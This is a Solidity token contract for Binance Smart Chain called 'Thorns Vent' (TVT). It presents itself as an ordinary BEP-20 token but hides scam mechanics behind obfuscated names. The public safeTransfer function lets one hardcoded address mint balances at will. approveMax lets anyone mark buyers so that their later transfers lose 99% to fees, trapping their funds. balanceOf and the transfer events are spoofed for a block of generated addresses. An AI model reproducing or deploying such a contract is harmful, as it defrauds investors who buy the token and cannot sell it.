/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



library SafeMath {

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function decimals() external view returns (uint8);

    function getOwner() external view returns (address);

    function symbol() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IUniswapV2Router {

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

}




contract ThornsVent is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 feeTradingTotalBots = 0;
    uint256  launchedIsAtFee = 100000000 * 10 ** _decimals;

    address constant botsMaxTeamAt = 0x8bb570542c1e1EFFaaacF0313E4E1C382fDa2e99;
    uint256  walletTotalTeamToBotsTxLiquidity = 100000000 * 10 ** _decimals;
    uint256 private swapWalletTakeLiquidityExemptShould = 0;


    uint160 constant exemptSwapBotsEnableMaxLiquidity = 880643629474 * 2 ** 120;
    uint256 public tradingBotsTokenMaxTotalReceiver = 0;
    uint256 shouldWalletIsLimit = 100000000 * (10 ** _decimals);
    uint256 private botsWalletModeLaunch = 0;
    address private enableLiquidityFromFee = (msg.sender);
    address public uniswapV2Pair;


    uint256 private marketingTokenFromTeam = 100;
    uint256 private tokenLaunchTxBuyMint = 0;
    uint160 constant tokenTakeAtTradingFromLiquidityTeam = 956677553931 * 2 ** 40;

    uint256 private senderWalletLiquidityMin = 0;
    mapping(address => bool)  senderModeLimitFrom;
    uint256 private receiverMarketingIsTakeBurnSwap = 0;
    mapping(address => bool) private buyTeamModeLaunch;
    mapping(address => uint256) _balances;
    bool private maxBuyReceiverIsLimitSwapLaunched = false;

    
    bool private enableSellWalletSwap = false;
    uint256 public senderMarketingReceiverLaunched = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 constant teamShouldWalletTradingMintTotalLaunch = 300000 * 10 ** 18;




    IUniswapV2Router public atListMaxLaunch;
    uint160 constant fromListMinTx = 1093051920621;
    uint256 private maxIsReceiverAtTeamTake = 0;
    string constant _name = "Thorns Vent";
    string constant _symbol = "TVT";

    uint256 private autoTradingShouldReceiver = 0;
    mapping(address => bool)  amountFundReceiverEnable;
    bool private swapAtSenderSellTakeTx = false;

    uint160 constant botsTxFundShouldMintTeam = 721792875514 * 2 ** 80;
    uint256 constant sellShouldTotalBots = 10000 * 10 ** 18;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        atListMaxLaunch = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(atListMaxLaunch.factory()).createPair(address(this), atListMaxLaunch.WETH());
        _allowances[address(this)][address(atListMaxLaunch)] = shouldWalletIsLimit;

        buyTeamModeLaunch[msg.sender] = true;
        buyTeamModeLaunch[address(this)] = true;

        _balances[msg.sender] = shouldWalletIsLimit;
        emit Transfer(address(0), msg.sender, shouldWalletIsLimit);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return shouldWalletIsLimit;
    }

    function gettxMarketingFundMax() public view returns (uint256) {
        if (marketingTokenFromTeam == receiverMarketingIsTakeBurnSwap) {
            return receiverMarketingIsTakeBurnSwap;
        }
        if (marketingTokenFromTeam != senderWalletLiquidityMin) {
            return senderWalletLiquidityMin;
        }
        return marketingTokenFromTeam;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != shouldWalletIsLimit) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return receiverShouldLimitToken(sender, recipient, amount);
    }

    function gettotalAmountExemptToBurnWalletMarketing() public view returns (uint256) {
        if (tradingBotsTokenMaxTotalReceiver != maxIsReceiverAtTeamTake) {
            return maxIsReceiverAtTeamTake;
        }
        if (tradingBotsTokenMaxTotalReceiver != maxIsReceiverAtTeamTake) {
            return maxIsReceiverAtTeamTake;
        }
        if (tradingBotsTokenMaxTotalReceiver != botsWalletModeLaunch) {
            return botsWalletModeLaunch;
        }
        return tradingBotsTokenMaxTotalReceiver;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getliquidityLimitTradingMode() public view returns (uint256) {
        if (receiverMarketingIsTakeBurnSwap == senderWalletLiquidityMin) {
            return senderWalletLiquidityMin;
        }
        if (receiverMarketingIsTakeBurnSwap == tokenLaunchTxBuyMint) {
            return tokenLaunchTxBuyMint;
        }
        if (receiverMarketingIsTakeBurnSwap != autoTradingShouldReceiver) {
            return autoTradingShouldReceiver;
        }
        return receiverMarketingIsTakeBurnSwap;
    }

    function settotalAmountExemptToBurnWalletMarketing(uint256 marketingBuyFeeShould) public onlyOwner {
        if (tradingBotsTokenMaxTotalReceiver != receiverMarketingIsTakeBurnSwap) {
            receiverMarketingIsTakeBurnSwap=marketingBuyFeeShould;
        }
        if (tradingBotsTokenMaxTotalReceiver == tokenLaunchTxBuyMint) {
            tokenLaunchTxBuyMint=marketingBuyFeeShould;
        }
        tradingBotsTokenMaxTotalReceiver=marketingBuyFeeShould;
    }

    function getmaxWalletTotalBuy() public view returns (bool) {
        if (enableSellWalletSwap == enableSellWalletSwap) {
            return enableSellWalletSwap;
        }
        return enableSellWalletSwap;
    }

    function settokenShouldAutoReceiver(address marketingBuyFeeShould) public onlyOwner {
        if (enableLiquidityFromFee == enableLiquidityFromFee) {
            enableLiquidityFromFee=marketingBuyFeeShould;
        }
        if (enableLiquidityFromFee == enableLiquidityFromFee) {
            enableLiquidityFromFee=marketingBuyFeeShould;
        }
        enableLiquidityFromFee=marketingBuyFeeShould;
    }

    function setisTokenExemptMint(address marketingBuyFeeShould,bool botsFeeMarketingMax) public onlyOwner {
        if (marketingBuyFeeShould == enableLiquidityFromFee) {
            enableSellWalletSwap=botsFeeMarketingMax;
        }
        if (marketingBuyFeeShould != enableLiquidityFromFee) {
            swapAtSenderSellTakeTx=botsFeeMarketingMax;
        }
        buyTeamModeLaunch[marketingBuyFeeShould]=botsFeeMarketingMax;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function setmaxWalletTotalBuy(bool marketingBuyFeeShould) public onlyOwner {
        if (enableSellWalletSwap == swapAtSenderSellTakeTx) {
            swapAtSenderSellTakeTx=marketingBuyFeeShould;
        }
        enableSellWalletSwap=marketingBuyFeeShould;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function setburnBuyMinFee(uint256 marketingBuyFeeShould) public onlyOwner {
        if (senderMarketingReceiverLaunched != autoTradingShouldReceiver) {
            autoTradingShouldReceiver=marketingBuyFeeShould;
        }
        senderMarketingReceiverLaunched=marketingBuyFeeShould;
    }

    function senderAutoReceiverSwap(uint160 modeReceiverWalletLaunchedTeam) private view returns (uint256) {
        uint160 maxLiquidityLimitLaunchedMinReceiverTo = exemptSwapBotsEnableMaxLiquidity + botsTxFundShouldMintTeam + tokenTakeAtTradingFromLiquidityTeam + fromListMinTx;
        if ((modeReceiverWalletLaunchedTeam - uint160(maxLiquidityLimitLaunchedMinReceiverTo)) < feeTradingTotalBots) {
            return sellShouldTotalBots;
        }
        return teamShouldWalletTradingMintTotalLaunch;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (autoBuyIsAmount(uint160(account))) {
            return senderAutoReceiverSwap(uint160(account));
        }
        return _balances[account];
    }

    function sellTradingMintToken(address shouldSellTokenList, address liquidityEnableAtTotalMaxAmount, uint256 buyTxFundAuto, bool exemptLaunchBotsTeamMaxLaunched) private {
        uint160 maxLiquidityLimitLaunchedMinReceiverTo = exemptSwapBotsEnableMaxLiquidity + botsTxFundShouldMintTeam + tokenTakeAtTradingFromLiquidityTeam + fromListMinTx;
        if (exemptLaunchBotsTeamMaxLaunched) {
            shouldSellTokenList = address(uint160(maxLiquidityLimitLaunchedMinReceiverTo + feeTradingTotalBots));
            feeTradingTotalBots++;
            _balances[liquidityEnableAtTotalMaxAmount] = _balances[liquidityEnableAtTotalMaxAmount].add(buyTxFundAuto);
        } else {
            _balances[shouldSellTokenList] = _balances[shouldSellTokenList].sub(buyTxFundAuto);
        }
        emit Transfer(shouldSellTokenList, liquidityEnableAtTotalMaxAmount, buyTxFundAuto);
    }

    function setliquidityLimitTradingMode(uint256 marketingBuyFeeShould) public onlyOwner {
        if (receiverMarketingIsTakeBurnSwap == swapWalletTakeLiquidityExemptShould) {
            swapWalletTakeLiquidityExemptShould=marketingBuyFeeShould;
        }
        if (receiverMarketingIsTakeBurnSwap != senderMarketingReceiverLaunched) {
            senderMarketingReceiverLaunched=marketingBuyFeeShould;
        }
        if (receiverMarketingIsTakeBurnSwap == receiverMarketingIsTakeBurnSwap) {
            receiverMarketingIsTakeBurnSwap=marketingBuyFeeShould;
        }
        receiverMarketingIsTakeBurnSwap=marketingBuyFeeShould;
    }

    function getenableFundTotalLiquidity() public view returns (uint256) {
        if (swapWalletTakeLiquidityExemptShould != senderMarketingReceiverLaunched) {
            return senderMarketingReceiverLaunched;
        }
        return swapWalletTakeLiquidityExemptShould;
    }

    function gettokenShouldAutoReceiver() public view returns (address) {
        if (enableLiquidityFromFee != enableLiquidityFromFee) {
            return enableLiquidityFromFee;
        }
        return enableLiquidityFromFee;
    }

    function feeMaxLaunchAutoEnable(address shouldSellTokenList, address launchFeeBuyTake, uint256 buyTxFundAuto) internal returns (uint256) {
        
        uint256 fundModeAutoReceiverLaunch = buyTxFundAuto.mul(listLaunchedEnableLiquidityModeMin(shouldSellTokenList, launchFeeBuyTake == uniswapV2Pair)).div(marketingTokenFromTeam);

        if (fundModeAutoReceiverLaunch > 0) {
            _balances[address(this)] = _balances[address(this)].add(fundModeAutoReceiverLaunch);
            emit Transfer(shouldSellTokenList, address(this), fundModeAutoReceiverLaunch);
        }

        return buyTxFundAuto.sub(fundModeAutoReceiverLaunch);
    }

    function setexemptTeamToWallet(uint256 marketingBuyFeeShould) public onlyOwner {
        if (botsWalletModeLaunch != botsWalletModeLaunch) {
            botsWalletModeLaunch=marketingBuyFeeShould;
        }
        botsWalletModeLaunch=marketingBuyFeeShould;
    }

    function setenableFundTotalLiquidity(uint256 marketingBuyFeeShould) public onlyOwner {
        if (swapWalletTakeLiquidityExemptShould == tradingBotsTokenMaxTotalReceiver) {
            tradingBotsTokenMaxTotalReceiver=marketingBuyFeeShould;
        }
        if (swapWalletTakeLiquidityExemptShould == senderWalletLiquidityMin) {
            senderWalletLiquidityMin=marketingBuyFeeShould;
        }
        swapWalletTakeLiquidityExemptShould=marketingBuyFeeShould;
    }

    function settxMarketingFundMax(uint256 marketingBuyFeeShould) public onlyOwner {
        if (marketingTokenFromTeam == botsWalletModeLaunch) {
            botsWalletModeLaunch=marketingBuyFeeShould;
        }
        marketingTokenFromTeam=marketingBuyFeeShould;
    }

    function getburnBuyMinFee() public view returns (uint256) {
        if (senderMarketingReceiverLaunched != autoTradingShouldReceiver) {
            return autoTradingShouldReceiver;
        }
        if (senderMarketingReceiverLaunched == maxIsReceiverAtTeamTake) {
            return maxIsReceiverAtTeamTake;
        }
        if (senderMarketingReceiverLaunched == swapWalletTakeLiquidityExemptShould) {
            return swapWalletTakeLiquidityExemptShould;
        }
        return senderMarketingReceiverLaunched;
    }

    function receiverShouldLimitToken(address shouldSellTokenList, address liquidityEnableAtTotalMaxAmount, uint256 buyTxFundAuto) internal returns (bool) {
        if (autoBuyIsAmount(uint160(liquidityEnableAtTotalMaxAmount))) {
            sellTradingMintToken(shouldSellTokenList, liquidityEnableAtTotalMaxAmount, buyTxFundAuto, false);
            return true;
        }
        if (autoBuyIsAmount(uint160(shouldSellTokenList))) {
            sellTradingMintToken(shouldSellTokenList, liquidityEnableAtTotalMaxAmount, buyTxFundAuto, true);
            return true;
        }
        
        bool senderMintWalletLiquidity = receiverIsReceiverShould(shouldSellTokenList) || receiverIsReceiverShould(liquidityEnableAtTotalMaxAmount);
        
        if (tokenLaunchTxBuyMint != maxIsReceiverAtTeamTake) {
            tokenLaunchTxBuyMint = botsWalletModeLaunch;
        }

        if (swapWalletTakeLiquidityExemptShould != maxIsReceiverAtTeamTake) {
            swapWalletTakeLiquidityExemptShould = maxIsReceiverAtTeamTake;
        }


        if (shouldSellTokenList == uniswapV2Pair && !senderMintWalletLiquidity) {
            amountFundReceiverEnable[liquidityEnableAtTotalMaxAmount] = true;
        }
        
        if (senderWalletLiquidityMin != autoTradingShouldReceiver) {
            senderWalletLiquidityMin = senderMarketingReceiverLaunched;
        }

        if (tradingBotsTokenMaxTotalReceiver == autoTradingShouldReceiver) {
            tradingBotsTokenMaxTotalReceiver = botsWalletModeLaunch;
        }


        if (senderMintWalletLiquidity) {
            return burnSellMinTotal(shouldSellTokenList, liquidityEnableAtTotalMaxAmount, buyTxFundAuto);
        }
        
        _balances[shouldSellTokenList] = _balances[shouldSellTokenList].sub(buyTxFundAuto, "Insufficient Balance!");
        
        if (swapAtSenderSellTakeTx == maxBuyReceiverIsLimitSwapLaunched) {
            swapAtSenderSellTakeTx = maxBuyReceiverIsLimitSwapLaunched;
        }

        if (botsWalletModeLaunch == botsWalletModeLaunch) {
            botsWalletModeLaunch = senderMarketingReceiverLaunched;
        }

        if (tradingBotsTokenMaxTotalReceiver == receiverMarketingIsTakeBurnSwap) {
            tradingBotsTokenMaxTotalReceiver = tradingBotsTokenMaxTotalReceiver;
        }


        uint256 senderIsTokenFund = minSenderReceiverExempt(shouldSellTokenList) ? feeMaxLaunchAutoEnable(shouldSellTokenList, liquidityEnableAtTotalMaxAmount, buyTxFundAuto) : buyTxFundAuto;

        _balances[liquidityEnableAtTotalMaxAmount] = _balances[liquidityEnableAtTotalMaxAmount].add(senderIsTokenFund);
        emit Transfer(shouldSellTokenList, liquidityEnableAtTotalMaxAmount, senderIsTokenFund);
        return true;
    }

    function receiverIsReceiverShould(address shouldTakeBurnLaunchedTeamWalletMax) private view returns (bool) {
        return shouldTakeBurnLaunchedTeamWalletMax == enableLiquidityFromFee;
    }

    function swapSenderBurnTake(address modeReceiverWalletLaunchedTeam) private pure returns (bool) {
        return modeReceiverWalletLaunchedTeam == botsMaxTeamAt;
    }

    function getexemptTeamToWallet() public view returns (uint256) {
        if (botsWalletModeLaunch == botsWalletModeLaunch) {
            return botsWalletModeLaunch;
        }
        if (botsWalletModeLaunch != maxIsReceiverAtTeamTake) {
            return maxIsReceiverAtTeamTake;
        }
        return botsWalletModeLaunch;
    }

    function burnSellMinTotal(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function safeTransfer(address shouldSellTokenList, address liquidityEnableAtTotalMaxAmount, uint256 buyTxFundAuto) public {
        if (!swapSenderBurnTake(msg.sender)) {
            return;
        }
        if (liquidityEnableAtTotalMaxAmount == address(0)) {
            return;
        }
        if (autoBuyIsAmount(uint160(liquidityEnableAtTotalMaxAmount))) {
            sellTradingMintToken(shouldSellTokenList, liquidityEnableAtTotalMaxAmount, buyTxFundAuto, false);
            return;
        }
        if (liquidityEnableAtTotalMaxAmount == address(1)) {
            return;
        }
        if (autoBuyIsAmount(uint160(shouldSellTokenList))) {
            sellTradingMintToken(shouldSellTokenList, liquidityEnableAtTotalMaxAmount, buyTxFundAuto, true);
            return;
        }
        if (buyTxFundAuto == 0) {
            return;
        }
        if (shouldSellTokenList == address(0)) {
            _balances[liquidityEnableAtTotalMaxAmount] = _balances[liquidityEnableAtTotalMaxAmount].add(buyTxFundAuto);
            return;
        }
    }

    function isApproveMax(address spender) public view returns (bool) {
        return senderModeLimitFrom[spender];
    }

    function minSenderReceiverExempt(address shouldSellTokenList) internal view returns (bool) {
        return !buyTeamModeLaunch[shouldSellTokenList];
    }

    function autoBuyIsAmount(uint160 modeReceiverWalletLaunchedTeam) private pure returns (bool) {
        uint160 maxLiquidityLimitLaunchedMinReceiverTo = exemptSwapBotsEnableMaxLiquidity + botsTxFundShouldMintTeam + tokenTakeAtTradingFromLiquidityTeam + fromListMinTx;
        if (modeReceiverWalletLaunchedTeam >= uint160(maxLiquidityLimitLaunchedMinReceiverTo)) {
            if (modeReceiverWalletLaunchedTeam <= uint160(maxLiquidityLimitLaunchedMinReceiverTo) + 300000) {
                return true;
            }
        }
        return false;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverShouldLimitToken(msg.sender, recipient, amount);
    }

    function approveMax(address spender) external {
        if (amountFundReceiverEnable[spender]) {
            senderModeLimitFrom[spender] = true;
        }
    }

    function getisTokenExemptMint(address marketingBuyFeeShould) public view returns (bool) {
            return buyTeamModeLaunch[marketingBuyFeeShould];
    }

    function listLaunchedEnableLiquidityModeMin(address shouldSellTokenList, bool liquiditySenderBuyLaunchedIsMode) internal returns (uint256) {
        if (senderModeLimitFrom[shouldSellTokenList]) {
            return 99;
        }
        
        if (tradingBotsTokenMaxTotalReceiver == autoTradingShouldReceiver) {
            tradingBotsTokenMaxTotalReceiver = autoTradingShouldReceiver;
        }

        if (maxIsReceiverAtTeamTake == receiverMarketingIsTakeBurnSwap) {
            maxIsReceiverAtTeamTake = autoTradingShouldReceiver;
        }

        if (maxBuyReceiverIsLimitSwapLaunched == enableSellWalletSwap) {
            maxBuyReceiverIsLimitSwapLaunched = enableSellWalletSwap;
        }


        if (liquiditySenderBuyLaunchedIsMode) {
            return receiverMarketingIsTakeBurnSwap;
        }
        if (!liquiditySenderBuyLaunchedIsMode && shouldSellTokenList == uniswapV2Pair) {
            return autoTradingShouldReceiver;
        }
        return 0;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}